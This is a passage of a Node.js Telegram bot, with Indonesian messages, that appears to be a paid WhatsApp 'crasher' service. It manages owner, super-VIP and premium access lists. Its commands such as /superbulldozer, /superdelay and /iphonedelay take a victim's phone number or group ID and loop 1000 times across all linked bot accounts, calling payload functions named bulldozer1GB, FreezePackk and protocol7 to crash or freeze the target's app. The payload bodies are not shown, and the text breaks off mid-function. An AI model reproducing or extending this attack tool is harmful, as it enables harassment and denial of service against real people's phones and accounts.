      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip dengan kedaluwarsa ${durationDays} hari.`
    );
  });
});

bot.onText(/\/delsvip(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗ Hanya OWNER yang bisa hapus SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delsvip <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");
  const userIndex = supervipUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan dalam daftar SVIP.");
  }
  supervipUsers.splice(userIndex, 1);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listsvip/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗Hanya OWNER yang bisa lihat daftar SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  const validSupervipUsers = supervipUsers.filter(user => user.expiresAt > Date.now());

  if (!validSupervipUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar SVIP kosong.");
  }

  const svipList = validSupervipUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    ` *LIST SUPER VIP USER :*\n\`\`\`\n${svipList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});


const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  
  // Cek apakah waktu kedaluwarsa sudah lewat
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    // Hapus pengguna yang kedaluwarsa dari daftar
    premiumUsers = premiumUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(premiumFile, `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};`);
    return false;  
  }

  return true; 
}


bot.onText(/\/cekidgb/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ No active bot. Please /addbot.");
  }

  const allGroups = [];

  for (const [name, sock] of sessions.entries()) {
    try {
      const groups = await sock.groupFetchAllParticipating();
      const groupList = Object.values(groups);
      for (const group of groupList) {
        allGroups.push({
          bot: name,
          subject: group.subject,
          id: group.id
        });
      }
    } catch (err) {
      console.error(`Gagal ambil grup dari ${name}:`, err);
    }
  }

  if (allGroups.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada grup yang ditemukan.");
  }

  groupDataCache.set(userId, allGroups);

  const page = 0;
  const { text, inline_keyboard } = generateGroupListPage(allGroups, page);

  bot.sendMessage(chatId, text, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard }
  });
});

// Handle callback pagination
bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const userId = callbackQuery.from.id;
  const data = callbackQuery.data;

  if (!data.startsWith('group_page_')) return;

  const page = parseInt(data.split('_')[2]);
  const groups = groupDataCache.get(userId);
  if (!groups) return;

  const { text, inline_keyboard } = generateGroupListPage(groups, page);

  bot.editMessageText(text, {
    chat_id: msg.chat.id,
    message_id: msg.message_id,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard }
  }).catch((e) => {
    console.error("Edit message error:", e.message);
  });

  bot.answerCallbackQuery(callbackQuery.id);
});

// Helper: generate paginated message
function generateGroupListPage(groups, page) {
  const start = page * GROUPS_PER_PAGE;
  const end = start + GROUPS_PER_PAGE;
  const pageGroups = groups.slice(start, end);

  let text = "```";
  text += "\n╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐆𝐑𝐎𝐔𝐏 」";

  for (const group of pageGroups) {
    text += "\n║";
    text += `\n┃ ◇ 𝐁𝐎𝐓 : ${group.bot}`;
    text += `\n┃ ◇ 𝐍𝐀𝐌𝐀 𝐆𝐑𝐎𝐔𝐏 : ${group.subject}`;
    text += `\n┃ ◇ 𝐈𝐃 : ${group.id}`;
  }

  text += "\n╰━━━━━━━━━━━━━━━━━━⭓";
  text += "\n```";

  const totalPages = Math.ceil(groups.length / GROUPS_PER_PAGE);

  const buttons = [];
  if (page > 0) buttons.push({ text: '◀️ Prev', callback_data: `group_page_${page - 1}` });
  if (end < groups.length) buttons.push({ text: 'Next ▶️', callback_data: `group_page_${page + 1}` });

  return {
    text,
    inline_keyboard: buttons.length > 0 ? [buttons] : []
  };
}

bot.onText(/\/addprem(?:\s+(.+)\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example : /addprem <id> <days>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const expirationDays = parseInt(match[2]);

  if (!newUserId || isNaN(expirationDays) || expirationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau waktu kedaluwarsa tidak valid.");
  }

  if (premiumUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah premium.");
  }

  const expiresAt = Date.now() + expirationDays * 24 * 60 * 60 * 1000;

  premiumUsers.push({ id: newUserId, expiresAt });

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium dengan waktu kedaluwarsa ${expirationDays} hari.`
    );
  });
});

bot.onText(/\/delprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, "❗️Bot only used on group.",{
    parse_mode: 'Markdown'
  });
}
  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delprem <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  const userIndex = premiumUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan di daftar premium.");
  }

  premiumUsers.splice(userIndex, 1);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan data premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  if (!premiumUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar pengguna premium kosong.");
  }

  const premiumList = premiumUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    `📋 *LIST PREMIUM USER :*\n\`\`\`\n${premiumList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
  if (!isSupervip(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
  // Akses hanya untuk OWNER & SVIP
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/grouponly (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", {
      parse_mode: "Markdown"
    });
  }

  const state = match[1].toLowerCase();
  settings.groupOnly = state === 'on';

  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Mode *Group Only* telah *${settings.groupOnly ? 'AKTIF' : 'NONAKTIF'}*.`, {
      parse_mode: 'Markdown'
    });
  } catch (error) {
    bot.sendMessage(chatId, "❌ Gagal menyimpan pengaturan.", {
      parse_mode: 'Markdown'
    });
    console.error("Gagal menulis settings.json:", error);
  }
});

bot.onText(/^\/grouponly$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  bot.sendMessage(chatId, '❗️Example: /grouponly on');
});

bot.onText(/^\/setcd (\d+)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.", {
      parse_mode: "Markdown"
    });
  }

  const newCd = parseInt(match[1]);
  if (isNaN(newCd) || newCd < 0) {
    return bot.sendMessage(chatId, '⚠️ Masukkan angka yang valid (>= 0).');
  }
  settings.cooldown = newCd;
  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Cooldown berhasil diubah menjadi *${newCd} detik*.`, {
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error("Gagal menyimpan ke settings.json:", err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat menyimpan pengaturan.');
  }
});


bot.onText(/^\/setcd$/, (msg) => {
  bot.sendMessage(msg.chat.id, '❗️Example: /setcd 60');
});

//CRASHER COMMAND SECTION
bot.onText(/\/superbulldozer(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
      if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
    if (!isPremium(userId) && !isSupervip(userId) && !isOwner(userId)) {
      return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /snuke 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ No active bot. Please /addbot.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
    
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 𝐒 ✦ 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝐒𝐔𝐏𝐄𝐑𝐁𝐔𝐋𝐋𝐃𝐎𝐙𝐄𝐑
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await snuke(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("superbulldozer ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/superdelay(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
    if (!isPremium(userId) && !isSupervip(userId) && !isOwner(userId)) {
      return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /superdelay 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ No active bot. Please /addbot.");
    }
    
  const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);

    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
      caption: `
\`\`\`
╭━━━⭓「 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 𝐒 ✦ 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝐒𝐂𝐔𝐁𝐄
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await superdelay(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("superdelay ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/frezedelay(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
        if (!isPremium(userId) && !isSupervip(userId) && !isOwner(userId)) {
      return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /frezedelay 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ No active bot. Please /addbot.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
    
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 𝐒 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝐒𝐏𝐇𝐘𝐗
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await frezedelay(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("frezedelay ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/sgroupx(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
      return bot.sendMessage(chatId, '❗️Bot only used on group.', {
        parse_mode: 'Markdown'
      });
    }

    if (!isPremium(userId) && !isSupervip(userId) && !isOwner(userId)) {
      return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /sgroupx 1203630xxxxx", { parse_mode: "Markdown" }); // Group JID format
    }

    const formattedGroupId = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedGroupId}@g.us`; // Group target

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ No active bot. Please /addbot.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);

    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
      caption: `
\`\`\`
╭━━━⭓「 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 𝐒 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝐒𝐆𝐑𝐎𝐔𝐏𝐗
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedGroupId}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙂𝙧𝙤𝙪𝙥 」",
              url: `https://chat.whatsapp.com/${formattedGroupId}`
            }
          ],
        ],
      },
    });

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sgroupx(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("sgroupx ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/iphonedelay(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '❗️Bot only used on group.', {
    parse_mode: 'Markdown'
  });
}
      if (!isPremium(userId) && !isSupervip(userId) && !isOwner(userId)) {
      return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /iphonedelay 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ No active bot. Please /addbot.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
    
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 𝐒 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝐈𝐏𝐇𝐎𝐍𝐄𝐃𝐄𝐋𝐀𝐘
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await iphonedelay(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("iphonedelay ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

// !! [ LOOPING / COMBO FUNCTION SECTION ] !!
// jid itu target
// sock itu nomer bot

//snuke function
async function snuke(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING DEATH FLOW to ${jid}`));

  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`DEATH FLOW to ${jid}`));

    await safeExec("bulldozer1GB", () => bulldozer1GB(sock, jid));
    await safeExec("bulldozer1GB", () => bulldozer1GB(sock, jid));
    await safeExec("bulldozer1GB", () => bulldozer1GB(sock, jid));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("ZeroRadiactive", () => ZeroRadiactive(sock, jid, true));
    await safeExec("ZeroRadiactive", () => ZeroRadiactive(sock, jid, true));
    await safeExec("ZeroRadiactive", () => ZeroRadiactive(sock, jid, true));
    await delay(400);
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai superbulldozer ke ${jid} oleh ${sock.user.id}`);
}
//superdelay function
async function superdelay(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING superdelay ${jid}`));

  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`superdelay superdelay to ${jid}`));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid));
    await delay(400);
    await safeExec("protocol8T", () => protocol8T(sock, jid, true));
    await safeExec("protocol8T", () => protocol8T(sock, jid, true));
    await safeExec("protocol8T", () => protocol8T(sock, jid, true));
    await safeExec("ChronosDelay",() => ChronosDelay(sock, jid, true));
    await safeExec("ChronosDelay",() => ChronosDelay(sock, jid, true));
    await safeExec("ChronosDelay",() => ChronosDelay(sock, jid, true));
    await delay(400);
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
